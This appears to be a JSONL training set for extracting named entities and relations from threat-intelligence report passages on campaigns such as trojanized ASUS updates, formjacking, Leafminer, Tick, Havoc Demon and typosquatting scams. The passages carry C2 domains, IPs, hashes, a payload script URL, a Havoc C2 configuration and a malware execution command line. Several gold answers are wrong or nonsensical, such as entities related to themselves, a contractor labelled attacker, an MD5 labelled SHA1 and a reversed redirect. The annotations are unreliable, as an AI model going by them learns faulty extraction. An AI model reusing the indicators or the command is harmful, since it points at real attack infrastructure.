{"instruction": "The Trojanized updates search for specific machines based on their unique MAC addresses. If specific MAC addresses are found, the installed updates attempt to connect to asushotfix[.]com. This domain is currently offline. How many victims are there? Symantec telemetry shows that at least 13,000 computers received the Trojanized updates. 80 percent of victims were consumers and 20 percent were from organizations. Our telemetry shows an even spread of victims across the globe. Figure. Computers that received Trojanized ASUS updates were spread across the globe What is the motivation behind the attack? The attacker motivation is unclear at this time. Who are the attackers behind this attack? This is unknown at this time. What is a supply chain attack?", "input": null, "output": "Named Entities: (Trojanized updates, malware), (asushotfix[.]com, Domain)\nRelationships: (Trojanized updates, connect to, asushotfix[.]com)"}
{"instruction": "(CVE-2018-8626) MS Rating: Critical A remote code execution vulnerability exists in Windows Domain Name System (DNS) servers when they fail to properly handle requests. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the Local System Account. Microsoft Text-To-Speech Remote Code Execution Vulnerability (CVE-2018-8634) MS Rating: Critical A remote code execution vulnerability exists in Windows where Microsoft text-to-speech fails to properly handle objects in the memory. An attacker who successfully exploited this vulnerability could take control of the affected system. Remote Procedure Call runtime Information Disclosure Vulnerability (CVE-2018-8514) MS Rating: Important An information disclosure vulnerability exists when Remote Procedure Call runtime improperly initializes objects in memory. To exploit this vulnerability, an authenticated attacker could run a specially crafted application. Windows GDI Information Disclosure Vulnerability", "input": null, "output": "Named Entities: (CVE-2018-8626, vulnerability), (Windows Domain Name System, tool), (CVE-2018-8634, vulnerability), (Microsoft text-to-speech, tool), (Remote Procedure Call runtime, tool), (Windows GDI, tool)\nRelationships: (CVE-2018-8626, exploit, Windows Domain Name System), (CVE-2018-8634, exploit, Microsoft text-to-speech)"}
{"instruction": "New campaign, new technique Recently, we came across a website of a retail store in Paris which was injected with a formjacking script (Figure 1). Figure 1. Code injected into affected sites\u2019 pages The code shown in Figure 1 collects the payment information entered by users on the website and posts it to the domain google-analyitics.org . This domain is a typo-squatted version of the legitimate Google Analytics domain, google-analytics.com . This was no new occurrence for us, considering the number of payment information-stealing script injections we see daily. However, digging into our telemetry, we came across an interesting pattern. We observed popular websites from different countries\u2014such as the U.S., Japan, Australia, and Germany\u2014redirecting to this one Paris website. This created an interesting redirection chain as customers of all these websites were being infected by formjacking at the same time. Figure 2 shows how this infection chain works.", "input": null, "output": "Named Entities: (formjacking script, malware), (google-analyitics.org, Domain), (google-analytics.com, Domain)\nRelationships: No related relations."}
{"instruction": "Multiple flavors of formjacking In addition to the code previously mentioned, we have seen many other scripts injected into websites to steal payment information in various ways. For example, the code shown in Figure 4 was injected into one set of affected websites. Figure 4. Injected code that forces the browser to load malicious obfuscated JavaScript The script creates a script element and sets its source to https://apitstatus.com/api.js?v=3.0.8 . This forces the browser to load malicious obfuscated JavaScript from apitstatus.com , which in turn collects the entered payment information and posts it back to the attackers\u2019 domain. On yet another set of websites, we discovered the code shown in Figure 5. Figure 5. Obfuscated script which hooks website forms and steals entered form data", "input": null, "output": "Named Entities: (formjacking, threat type), (https://apitstatus.com/api.js?v=3.0.8, URL), (apitstatus.com, Domain)\nRelationships: (https://apitstatus.com/api.js?v=3.0.8, domain, apitstatus.com), (apitstatus.com, post, attackers' domain)"}
{"instruction": "Leafminer\u2019s arsenal During our investigation, there was a breakthrough discovery that helped connect Leafminer to a number of attacks observed on systems in the Middle East and identify the toolkit used in the group\u2019s efforts of intrusion, lateral movement, and exfiltration. The download URL for a malware payload used in one of the attacks lead to the identification of a compromised web server on the domain e-qht.az that had been used to distribute Leafminer\u2019s arsenal of malware, payloads, and tools within the group and make them available for download from victim machines. As of early June 2018, the server hosted 112 files in a subdirectory that could be accessed through a public web shell planted by the attackers. In addition to malware and tools, the served files also included uploads of log files seemingly originating from vulnerability scans and post-compromise tools.", "input": null, "output": "Named Entities: (Leafminer, attacker), (malware payload, malware), (e-qht.az, Domain), (web server, tool)\nRelationships: (Leafminer, connect to, Leafminer), (malware payload, used in, Leafminer), (e-qht.az, used by, Leafminer), (web server, hosted by, e-qht.az), (post-compromise tools, originating from, e-qht.az)"}
{"instruction": "Lateral movement and exfiltration The discovery of malware and hacktools hosted on e-qht.az allowed us to correlate detection telemetry of potential Leafminer intrusions with tools made available for download to the group\u2019s operators. Understanding the purpose of the tools used by the attacker gives a unique insight into the tactics and procedures used by Leafminer after the initial compromise of a target network. Table 3 outlines the observed toolset for lateral movement, information gathering, and exfiltration. Table 3. Toolset for lateral movement, information gathering, and exfiltration We discovered a number of servers compromised by Leafminer that were used as staging systems to gain a foothold in the targeted network and execute attacks on intranet resources. For example, the use of THC Hydra to execute dictionary attacks against Exchange logins was observed both in initial intrusion attempts as well as in lateral attacks from staging systems.", "input": null, "output": "Named Entities: (Leafminer, attacker), (e-qht.az, Domain), (THC Hydra, tool)\nRelationships: (Leafminer, host, e-qht.az), (Leafminer, use, THC Hydra)"}
{"instruction": "(CVE-2018-8222) MS Rating: Important A security bypass vulnerability exists in Device Guard that could allow an attacker to inject malicious code into a Windows PowerShell session. An attacker who successfully exploited this vulnerability could inject code into a trusted PowerShell process to bypass the Device Guard Code Integrity policy on the local machine. Microsoft Macro Assembler Tampering Vulnerability (CVE-2018-8232) MS Rating: Moderate A Tampering vulnerability exists when Microsoft Macro Assembler improperly validates code. An attacker could introduce code into an application, which modifies data in an unintended manner. Windows DNSAPI Denial of Service Vulnerability (CVE-2018-8304) MS Rating: Important A denial of service vulnerability exists in Windows Domain Name System (DNS) DNSAPI. dll when it fails to properly handle DNS responses. Windows Mail Client Information Disclosure Vulnerability", "input": null, "output": "Named Entities: (CVE-2018-8222, vulnerability), (Device Guard, tool), (Windows PowerShell, tool), (CVE-2018-8232, vulnerability), (Microsoft Macro Assembler, tool), (Windows DNSAPI, tool), (CVE-2018-8304, vulnerability), (Windows Domain Name System, tool), (Windows Mail Client, tool)\nRelationships: (CVE-2018-8222, exploit, Device Guard), (Device Guard, bypass, Windows PowerShell), (CVE-2018-8232, introduce, Microsoft Macro Assembler), (CVE-2018-8304, handle, Windows Domain Name System)"}
{"instruction": "More than half of the group\u2019s earlier targets were in the Energy or Defense sectors, but it also targeted organizations in the Consultancy/Security, Aerospace, Research, and Media sectors, in addition to embassies. Its activities ranged across the globe, with targets located in South Africa, Kenya, the United Kingdom, Malaysia, Suriname, along with several other European and Middle Eastern countries. Word documents attached to Inception\u2019s spear-phishing emails leveraged two Microsoft Office vulnerabilities ( CVE-2014-1761 and CVE-2012-0158 ) to install malware on the recipient\u2019s computer. The malware had a multi-staged structure that began with a malicious RTF document and ended with an in-memory DLL payload that communicated, via the WebDAV protocol, with a command and control (C&C) address from a legitimate cloud service provider (CloudMe.com). The name \u201cInception\u201d comes from the group\u2019s many levels of obfuscation and indirection it employed in delivering this payload.", "input": null, "output": "Named Entities: (Inception, attacker), (CVE-2014-1761, vulnerability), (CVE-2012-0158, vulnerability), (malware, malware), (CloudMe.com, Domain)\nRelationships: No related relations."}
{"instruction": "Further layers of obfuscation emerged when Blue Coat was able to determine that the attackers were communicating with CloudMe.com through a hacked network of compromised routers, the majority of which were located in South Korea.", "input": null, "output": "Named Entities: (CloudMe.com, Domain)\nRelationships: (attackers, communicate with, CloudMe.com)"}
{"instruction": "Command and control servers Tick uses compromised web servers to distribute malware and, in some instances, for its command and control (C&C) infrastructure. However, in most cases, it relies on its own infrastructure for C&C purposes. In its most recent campaigns, the group registered the domains used for C&C servers days after the malware was compiled. For example, one of the variants of Daserf used was compiled on July 8, 2015. This sample was seen contacting the C&C domain www[.]dreamsig[.]com, which was first registered on July 13, 2015, five days after the compilation date. This pattern occurred in multiple Daserf samples. Another interesting aspect of the communication between the malware and the C&C infrastructure is how the malware changes the URL from a randomly chosen variable selected from a predefined list. Predefined list from Daserf MD5: 765017E16842C9EB6860A7E9F711B0DB rjdyw.asp xszgj.asp dheyf.asp ejdhf.asp gxbne.asp swetf.asp qgfhr.asp whjdh.asp zgfer.asp cshyr.asp fxkle.asp tmwry.asp viksr.asp", "input": null, "output": "Named Entities: (Tick, attacker), (compromised web servers, tool), (C&C servers, tool), (www[.]dreamsig[.]com, Domain), (Daserf, malware)\nRelationships: (Tick, use, compromised web servers), (Tick, use, C&C servers), (Daserf, contact, www[.]dreamsig[.]com)"}
{"instruction": "ycghw.asp Symantec identified multiple C&C domains used by Tick. Unfortunately, Tick frequently used either privacy protection services or domain brokers to mask registration information. These tactics are used to make discovery and attribution more difficult. Table. Examples of Tick C&C domains and associated MD5 hashes C&C domain Parent hash charlie-harada[.]com 122652ca6ef719f8ba2d8d412ea184fe isozaki.sakura.ne[.]jp 4601e75267d0dcfe4256c43f45ec470a www.aucsellers[.]com 7ec173d469c2aa7a3a15acb03214256c www.lunwe[.]com 8d5bf506e55ab736f4c018d15739e352 c-saika[.]jp 3fa5965a1de2c095de38f22f0645af3e b33f4b8e776b94dc48c234ce9897cf74 kcm-store[.]com 63fe9f06068823b02b925e4a74a57db0 htpc[.]jp a629926313ee12163e1bdd2bb633e0e2 d3031438d80913f21ec6d3078dc77068 rlsolar[.]jp d3031438d80913f21ec6d3078dc77068", "input": null, "output": "Named Entities: (ycghw.asp, file), (Tick, attacker), (charlie-harada[.]com, Domain), (isozaki.sakura.ne[.]jp, Domain), (www.aucsellers[.]com, Domain), (www.lunwe[.]com, Domain), (c-saika[.]jp, Domain), (b33f4b8e776b94dc48c234ce9897cf74, MD5), (kcm-store[.]com, Domain), (htpc[.]jp, Domain), (a629926313ee12163e1bdd2bb633e0e2, MD5), (d3031438d80913f21ec6d3078dc77068, MD5), (rlsolar[.]jp, Domain), (d3031438d80913f21ec6d3078dc77068, MD5)\nRelationships: (Tick, use, ycghw.asp), (Tick, use, charlie-harada[.]com), (Tick, use, isozaki.sakura.ne[.]jp), (Tick, use, www.aucsellers[.]com), (Tick, use, www.lunwe[.]com), (Tick, use, c-saika[.]jp), (Tick, use, b33f4b8e776b94dc48c234ce9897cf74), (Tick, use, kcm-store[.]com), (Tick, use, htpc[.]jp), (Tick, use, a629926313ee12163e1bdd2bb633e0e2), (Tick, use, d3031438d80913f21ec6d3078dc77068), (Tick, use, rlsolar[.]jp), (Tick, use, d3031438d80913f21ec6d3078dc77068)"}
{"instruction": "Unfortunately, we need more data to determine if the timestamps associated with Dripion dating back to November 2013 (7ad3b2b6eee18af6816b6f4f7f7f71a6) are legitimate or if they have been forged. The earliest known Dripion activity we were able to validate took place in November 2014. Despite the one-year gap in activity, it is possible that campaigns involving Dripion happened during this period and went undetected due to its small target window. Another interesting tactic used to deceive potential targets lies within the C&C infrastructure. The attackers created multiple domains with names similar to that of legitimate companies and websites in the antivirus community. For example the domains hyydn.nortonsoft[.]com and mhysix.mcfeesoft[.]com were both C&C domains used in attacks. Using typo-squat domains to mimic legitimate sites is a tactic frequently used to trick the targets as well as defenders, in an effort to make the domains blend in with normal activity.", "input": null, "output": "Named Entities: (Dripion, malware), (7ad3b2b6eee18af6816b6f4f7f7f71a6, SHA1), (hyydn.nortonsoft[.]com, Domain), (mhysix.mcfeesoft[.]com, Domain)\nRelationships: (hyydn.nortonsoft[.]com, C&C domain, Dripion), (mhysix.mcfeesoft[.]com, C&C domain, Dripion)"}
{"instruction": "Affected platforms: Linux Impacted parties: Any organization Impact: Remote attackers gain control of the vulnerable systems Severity level: Critical FortiGuard Labs encountered recent samples of a DDoS-as-a-service botnet calling itself Condi. It attempted to spread by exploiting TP-Link Archer AX21 (AX1800) routers vulnerable to CVE-2023-1389, which was disclosed in mid-March of this year. We have additionally observed an increasing number of Condi samples collected from our monitoring systems since the end of May 2023, indicating an active attempt to expand the botnet. This blog details the capabilities of this botnet. Condi Botnet: Buy or Rent While pivoting from the Command and Control (C2) domain cdn2[.]duc3k[.]com in one of the malware samples, FortiGuard Labs researchers found a sibling domain admin[.]duc3k[.]com that previously displayed the message \"contact @zxcr9999 telegram\u201d. A quick search revealed a Telegram channel, Condi Network, advertising a Condi botnet with capabilities matching those observed in our sample (Figure 1).", "input": null, "output": "Named Entities: (Condi, malware), (cdn2[.]duc3k[.]com, Domain), (admin[.]duc3k[.]com, Domain), (CVE-2023-1389, vulnerability)\nRelationships: (Condi, exploit, CVE-2023-1389), (cdn2[.]duc3k[.]com, sibling domain, admin[.]duc3k[.]com)"}
{"instruction": "Incidentally, the Laplas Clipper C2 panel at laplas[.]app resolves to 85[.]192[.]40[.]252 (Figure 14).", "input": null, "output": "Named Entities: (Laplas Clipper C2 panel, tool), (laplas[.]app, Domain), (85[.]192[.]40[.]252, IP)\nRelationships: (Laplas Clipper C2 panel, resolves to, laplas[.]app), (laplas[.]app, IP, 85[.]192[.]40[.]252)"}
{"instruction": "\nTechnical Analysis \u2013 C2 Communication\nAfter initialization, AndoryuBot sends a GET request to extract the victim\u2019s public IP address. The HTTP request to \u201capi.ipify.org\u201d has a hardcoded User-Agent string, shown in Figure 7.\nThen it starts a connection to its C2 server, 45[.]153[.]243[.]39[:]10333, using the SOCKS protocol. The code is shown in Figure 8.\nThe first data sent from the compromised endpoint is shown in Figure 9.", "input": null, "output": "Named Entities: (AndoryuBot, malware), (api.ipify.org, Domain), (45[.]153[.]243[.]39, IP)\nRelationships: (AndoryuBot, send GET request to, api.ipify.org), (AndoryuBot, connect to, 45[.]153[.]243[.]39)"}
{"instruction": "Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023. FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog. It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities. It also contains environment checking and Anti-VM functions. Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker\u2019s FTP server.", "input": null, "output": "Named Entities: (evilextractor[.]com, Domain), (malware, malware), (FTP server, tool)\nRelationships: (evilextractor[.]com, seen in, malware), (malware, upload, FTP server)"}
{"instruction": "The storage of a payload binary as a custom XML part of the document is a technique very similar to what\u2019s presented in this blog from the website mgeeky.tech. Even on the code level, there are striking similarities between the code used by the malicious document and what\u2019s presented in that blog. The website author offers a private tool that provides similar capabilities. Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog. Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document.", "input": null, "output": "Named Entities: (mgeeky.tech, Domain), (website author, attacker), (PoC, tool)\nRelationships: No related relations."}
{"instruction": "Once the payload is decoded, it is written to the hardcoded path \u201cC:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\u201d and executed using ShellExecute with the following command line: C:\\Windows\\System32\\conhost.exe --headless \"C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\" \"\u201d This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section. Payload Analysis Stage 1: OfficeTelemetry.dll Based on the filename of the payload binary, it tries to masquerade as a legitimate component of Microsoft Office. It is even signed with an invalid portal.office.com certificate (Figure 6). While this file has a DLL extension and contains multiple exports (Figure 7), it is a standalone EXE file. Upon execution, it locates a packed and compressed payload in the .vdata section (Figure 8) of the memory allocated for the current process. The payload storage is structured as follows: 1. Offset 0x0: Magic (8 bytes) 2. Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption)", "input": null, "output": "Named Entities: (C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll, file), (C:\\Windows\\System32\\conhost.exe, file), (Havoc Demon agent, malware), (Microsoft Office, tool), (portal.office.com, Domain)\nRelationships: No related relations."}
{"instruction": "The relevant fields in the check-in request are as follows: 1. Size of data package 2. Magic value: 0xDE 0xAD 0xBE 0xEF (hardcoded into Havoc) 3. Agent ID 4. Command ID: 0x63 (DEMON_INITIALIZE) 5. 32-byte AES key 6. 16-byte AES IV 7. AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, \"ukrtatnafta[.]org\", is specified for this sample. This domain is very similar to ukrtatnafta[.]com, owned by Ukrtatnafta, a Ukrainian oil refining company. To blend in with legitimate HTTP/HTTPS traffic, Demon randomly picks one of several URIs set in the configuration and applies a specified list of HTTP headers in the requests to the C2. The Teamserver C2 configuration extracted from this sample can be seen below. Host: ukrtatnafta[.]org:443 HTTPS: True Proxy enabled: No Method: POST Headers: Content-Type: application/javascript Pragma: public ETag: W/736fh0-3e Last-Modified: Mon, 05 Dec 2016 14:54:50 GMT Server: nginx/1.14.2", "input": null, "output": "Named Entities: (Havoc, malware), (Demon, malware), (ukrtatnafta[.]org, Domain), (ukrtatnafta[.]com, Domain), (Teamserver, tool), (C2 domain, tool)\nRelationships: (Demon, Configure, C2 domains), (Demon, Use, Teamserver), (Demon, Use, C2 domain), (ukrtatnafta[.]org, Similar to, ukrtatnafta[.]com)"}
{"instruction": "Once executed, it prints \u201clistening to tun0\u201d to the console and then starts communicating with the C2 host \u201ctroon[.]dns[.]army\u201d with the heartbeat message \u201c0x336699\u201d. The traffic capture is shown in Figure 8. Once it receives the command from the C2 server, it starts its attack.", "input": null, "output": "Named Entities: (troon[.]dns[.]army, Domain)\nRelationships: No related relations."}
{"instruction": "The second variant is \u201cLiGhT's Modded perlbot v2\u201d from 85[.]239[.]33[.]32. It downloads the files \u201cce\u201d and \u201cplm\u201d. Each has a slightly different configuration, as shown in Figure 10. The C2 host is \u201cjuice[.]baselinux[.]net\u201d, and the process name is \u201c/usr/sbin/mysql\u201d. The traffic capture is shown in Figure 11. The server was created in March 2023, and hundreds of victims are already in this channel.", "input": null, "output": "Named Entities: (LiGhT's Modded perlbot v2, malware), (85[.]239[.]33[.]32, IP), (juice[.]baselinux[.]net, Domain)\nRelationships: (LiGhT's Modded perlbot v2, C2 host, juice[.]baselinux[.]net), (LiGhT's Modded perlbot v2, IP, 85[.]239[.]33[.]32)"}
{"instruction": "FortiGuard Labs encountered the following message subjects in our recent investigation: Click me baby, one more time RETURNED MAIL: SEE TRANSCRIPT FOR DETAILS Isnydosj anhr ayownizdiitis Delivery failed Test Delivery reports about your e-mail Status Returned mail: Data format error RETURNED MAIL: DATA FORMAT ERROR Returned mail: see transcript for details Mail System Error - Returned Mail The following attachment names were also found to be used repeatedly: document.zip transcript.zip letter.zip attachment.zip .zip message.zip message.scr golfasian.com readme.scr mail.zip text.cmd <random number>@7686f6a96.com file.zip attachment.scr Typical attachment The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.). This increases the chances that users won\u2019t identify it as malicious. Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze.", "input": null, "output": "Named Entities: (document.zip, file), (transcript.zip, file), (letter.zip, file), (attachment.zip, file), (message.zip, file), (message.scr, file), (golfasian.com, Domain), (readme.scr, file), (mail.zip, file), (text.cmd, file), (<random number>@7686f6a96.com, file), (file.zip, file), (attachment.scr, file), (UPX, tool), (https://en.wikipedia.org/wiki/UPX, URL)\nRelationships: (UPX, compress, file)"}
{"instruction": "It rotates through a number of possible C2 domains in an attempt to locate an active one. As part of the legacy of spreading through file-sharing utilities, MyDoom also litters the \u201cC:\\Program Files\\Common Files\\Microsoft Shared\u201d folder with multiple versions of itself. It renames itself as some now very old and obsolete applications (e.g., Kazaa Lite) with a random name or phrase attached.", "input": null, "output": "Named Entities: (MyDoom, malware), (file-sharing utilities, tool)\nRelationships: (MyDoom, rotate through, C2 domains), (MyDoom, spread through, file-sharing utilities)"}
{"instruction": "The e-mail FortiGuard Labs discovered was, unsurprisingly, malicious. But what was interesting was that it had been sent by the recently resurgent Emotet group. Emotet (aka, Geodo and Heodo) began life as a banking Trojan but has since morphed into a jack-of-all-trades tool that can exploit several vulnerabilities to compromise its victims. Once it has infected a system, it then typically delivers additional payloads. And because it\u2019s modular, it is easily customizable by its users. This flexibility and resiliency are part of why Emotet has managed to survive at least one coordinated industry/law enforcement takedown in 2021. The phishing e-mail Although claiming to be from \u201cIRS.gov,\u201d this phishing e-mail originated from an organization\u2019s compromised e-mail account in Pakistan. The subject and body claim that the recipient\u2019s IRS K-1 forms are attached in a Zip archive encrypted with the password \u201c0440\u201d.", "input": null, "output": "Named Entities: (Emotet, malware), (Geodo, malware), (Heodo, malware), (IRS.gov, Domain)\nRelationships: (Emotet, aka, Geodo), (Emotet, aka, Heodo)"}
{"instruction": "Many of these are scams. The sheer amount of interest, demonstrated by the volume of trending hashtags on social media, has created an opportunity for threat actors to try and capitalize on unknowing victims. One such scam seeing rapid growth is the Amazon pallet scam, also known as mystery boxes, bulk return pallets, etc. The following example is a paid advertisement we recently came across on the default Microsoft start page built into Windows 10: Clicking on the top left advertisement, \u201cAmazon\u2019s unclaimed high-end electronics mystery boxes are being sold at bar [sic],\u201d takes us to the website fundelivereddss[.]com: The landing page appears convincing to the untrained eye, showing a large warehouse with brown boxes stacked on pallets:", "input": null, "output": "Named Entities: (scams, threat type), (Amazon pallet scam, threat type), (fundelivereddss[.]com, Domain)\nRelationships: (fundelivereddss[.]com, landing page of, Amazon pallet scam)"}
{"instruction": "Some forensics analysis of the photo shows it was taken from Twitter from an electrical contractor based in the United States: Another clue is that the domain fundelivereddss[.]com was only registered on October 29th. Recently registered domains are often hallmarks of a potential scam, popping up and then disappearing in time with an event, such as the holidays or the World Cup. Threat actors also know that search engine ranking for their new site will be low, so they use social media promotion to get these sites in front of potential victims.", "input": null, "output": "Named Entities: (fundelivereddss[.]com, Domain), (electrical contractor, attacker)\nRelationships: (fundelivereddss[.]com, seen in, electrical contractor)"}
{"instruction": "More Clues Another clue we observed was found within the privacy policy page. It includes a reference to herbertm[.]shop. This indicates that this template was likely reused by the same actor. To test this theory, we visited herbertm[.]shop to see what it contains. This page appears to be selling fashion items. However, we also see a floating interstitial that appears to be the last chance to order what appears to be Amazon returns: When viewing the link, we found it contains Amazon and EBay references: Amazon and eBay backlog, picking, liquidation \u3010Temporary sale\u3011 (herbertm[.]shop) https://www.herbertm[.]shop/products/products-amazon-and-ebay-backlog-picking-liquidation-temporary-sale?sales_pop=true&spm=..index.0.1", "input": null, "output": "Named Entities: (herbertm[.]shop, Domain), (https://www.herbertm[.]shop/products/products-amazon-and-ebay-backlog-picking-liquidation-temporary-sale?sales_pop=true&spm=..index.0.1, URL)\nRelationships: No related relations."}
{"instruction": "Unfortunately, when we clicked on the link, we found that the page no longer exists, so at this point we don\u2019t have any evidence that this was another pallet scam. However, the pattern used in the herbertm[.]shop and Fundelivereddss[.]com sites and the cross-reference between the two in the privacy policy indicates these were set up by the same perpetrators. So we kept looking. While a Google cache disn\u2019t provide us with any clues, looking at scamadviser.com revealed negative reviews from victims of herbertm[.]shop that make the connection clearer:", "input": null, "output": "Named Entities: (herbertm[.]shop, Domain), (Fundelivereddss[.]com, Domain), (scamadviser.com, Domain)\nRelationships: (herbertm[.]shop, connected to, Fundelivereddss[.]com), (scamadviser.com, negative reviews from, herbertm[.]shop)"}
{"instruction": "The threat actor can also send a request with the parameter \"/BOT_ID?intval=1\u201d to view the status of currently running tasks and whether assigned tasks have been completed. When CPU utilization is below a certain level (75% or 90%, depending on the number of concurrent workers used for the current task), a separate goroutine is spawned to process each domain. Botnet Commands Detect CMS GoTrim attempts to identify whether one of the four CMSes (WordPress, Joomla!, OpenCart, or DataLife Engine) is being used on the target website. It does this by checking for specific strings in the webpage content. Interestingly, it only targets self-hosted WordPress websites by checking the Referer HTTP header for \u201cwordpress.com\u201d. As managed WordPress hosting providers, such as wordpress.com, usually implement more security measures to monitor, detect, and block brute forcing attempts than self-hosted WordPress websites, the chance of success is not worth the risk of getting discovered.", "input": null, "output": "Named Entities: (threat actor, attacker), (CMS GoTrim, tool), (wordpress.com, Domain)\nRelationships: No related relations."}
{"instruction": "Technical Analysis \u2013 Exploit\nZerobot includes 21 exploits. The list is shown in Figure 12, and the affected products in Figure 13 are listed below. In addition to some IoT vulnerabilities, it includes Spring4Shell, phpAdmin, F5 Big, etc., to increase its success rate.\nThe two exploits named \u201cZERO_xxxxx\u201d at the top of Figure 12 were collected from the website \u201c0day.today\u201d (Figure 14). This site shares numerous exploits for \u201ceducational\u201d purposes. The numbers \u201c36290\u201d and \u201c32960\u201d were assigned from this website.\nThe payload data injected in the exploit is the same as the script file shown in Figure 3.", "input": null, "output": "Named Entities: (Zerobot, malware), (0day.today, Domain)\nRelationships: (0day.today, domain, 0day.today)"}
{"instruction": "The exeGen script prevents the prospective threat actor from having to edit the source code themselves by allowing them to change the configuration via a handy GUI. As seen in the figure above, there is a field labeled \u201cNGROK URL:\u201d. This refers to the requirement for an attacker to set up and use NGrok, which is effectively a legitimate reverse proxy service that many companies use to test their development systems. It makes it appear that the local infrastructure is attached to a sub-domain of \u201cngrok.com\u201d and not the attacker\u2019s actual location and IP address.", "input": null, "output": "Named Entities: (exeGen script, tool), (ngrok.com, Domain)\nRelationships: (attacker's actual location, IP, ngrok.com)"}
{"instruction": "Once all files have been encrypted, Cryptonite tries to identify where the victim is in the world from their IP address using \u201cipinfo.io\u201d and attempts to phone home. It connects to the aforementioned \u201cngrok.io\u201d to pass the victim\u2019s details back to the attacker. Finally, a ransom window is created on the victim\u2019s device that contains the attacker\u2019s details, as shown in Figure 3. The victim can enter their decryption key should they contact the attacker and pay the ransom (and if the attacker chooses to provide the key.) Contrary to the warning, there does not appear to be any restrictions on the number of times an incorrect key can be entered. The victim will, however, receive the following error message.", "input": null, "output": "Named Entities: (Cryptonite, malware), (ipinfo.io, Domain), (ngrok.io, Domain)\nRelationships: (Cryptonite, connect to, ipinfo.io), (Cryptonite, connect to, ngrok.io)"}
{"instruction": "The user is first redirected to the website leonvi[.]ru , and then redirected again to a fake Amazon \u201cloyalty program\u201d site that claims the user was randomly chosen for a survey. The site also claims that the user will have a chance to win an iPhone 13 Pro after completing the survey. Interestingly, the message was dated November 18, the day this investigation was conducted. And redirection from leonvi[.]ru stopped while we were investigating this scam. Those two events seem to respond to user activity, proving that even an old PDF and redirection scheme can still work today. Although iPhone 13 Pro was released in October of 2021, and a new model is already out, it is still probably a good lure due to recent inflation and the cost of Apple products.", "input": null, "output": "Named Entities: (leonvi[.]ru, Domain)\nRelationships: (leonvi[.]ru, stopped while, investigating this scam)"}
{"instruction": "Fortunately, these outcomes are relatively benign. This same attack could drop malware, load potentially unwanted applications, or launch a vulnerability exploit if the attacker chose to do so. Typosquatting Typosquatting is a type of cyberattack that leverages URLs mistyped by users. For example, blackfriday[.]com is a legitimate Web site that users can use to view Black Friday ads from numerous popular shopping sites, such as Amazon, BestBuy, and Walmart. According to similarweb, blackfriday[.]com had 2.7 million visitors in October. The visitor count is expected to increase as Black Friday approaches. Apparently, this is too good of an opportunity for cybercriminals to pass up. Visiting \u201cblackftiday[.]com\u201d redirects the visitor to what appears to be an online lottery site, which has nothing to do with Black Friday.", "input": null, "output": "Named Entities: (malware, malware), (blackfriday[.]com, Domain), (blackftiday[.]com, Domain)\nRelationships: (blackfriday[.]com, redirect to, blackftiday[.]com)"}
{"instruction": "Another example that leverages the misspelling of blackfriday[.]com is nlackfriday[.]com. Visiting this site redirects the user to totalav[.]com, a Web site of security solution software in a likely attempt to generate legitimate affiliate traffic and credits. According to our database, nlackfriday[.]com was created in November of 2016, potentially indicating that the attacker behind the redirection has been taking advantage of Black Friday typosquatting for at least six years. Since the attacker can choose any redirection destination, some previous visitors may have been even more unlucky, accidentally generating affiliate traffic for the attacker or being targeted with malware. Slickdeals (slickdeals[.]net) is another Web site similar to blackfriday[.]com. It collects ads and deals from a variety of online shopping sites. Our database shows slickdeals has been in business for 23 years. It also owns the subdomain \u201cblackfriday[.]slickdeals[.]net\u201d dedicated to Black Friday.", "input": null, "output": "Named Entities: (blackfriday[.]com, Domain), (nlackfriday[.]com, Domain), (totalav[.]com, Domain), (slickdeals[.]net, Domain), (blackfriday[.]slickdeals[.]net, Domain)\nRelationships: (nlackfriday[.]com, redirects to, totalav[.]com), (blackfriday[.]com, similar to, slickdeals[.]net), (slickdeals[.]net, owns subdomain, blackfriday[.]slickdeals[.]net)"}
{"instruction": "According to similarweb, slickdeals[.]com and blackfriday[.]slickdeals[.]com had 61.6 million and 148.8K visitors in October, respectively. That motivates attackers to take advantage of typosquatting on these domains. At the time of our investigation, visiting blackfriday.slickdelas[.]net prompted visitors to install a Web browser, \u201cChromnius.\u201d", "input": null, "output": "Named Entities: (slickdeals[.]com, Domain), (blackfriday[.]slickdeals[.]com, Domain), (blackfriday.slickdelas[.]net, Domain), (Chromnius, tool)\nRelationships: (blackfriday.slickdelas[.]net, prompted visitors to install, Chromnius)"}
{"instruction": "FortiGuard Labs recently discovered an email pretending to come from the Hungarian government. It informs the user that their new credentials to a governmental portal are attached. The attachment, however, is a zipped executable that, upon execution, extracts the Warzone RAT to memory and runs it. A few days after our initial discovery, the Hungarian National Cyber Security Center issued a warning about this attack. This post provides a detailed analysis. Affected platforms: Microsoft Windows Impacted parties: Microsoft Windows Users Impact: Provides remote access to the attacker Severity level: High Infection Vector The initial infection occurs via a phishing email (Figure 1) impersonating a Hungarian government portal. This portal is used to conduct official business online, such as submitting documents, ordering IDs, etc. The email tells the victim that their credentials have changed and that new ones are attached. The complete translation is: Subject: idp.gov.hu: Your new login data", "input": null, "output": "Named Entities: (Warzone RAT, malware), (phishing email, threat type), (idp.gov.hu, Domain)\nRelationships: (phishing email, contain, Warzone RAT), (attack, provide, remote access to attacker)"}
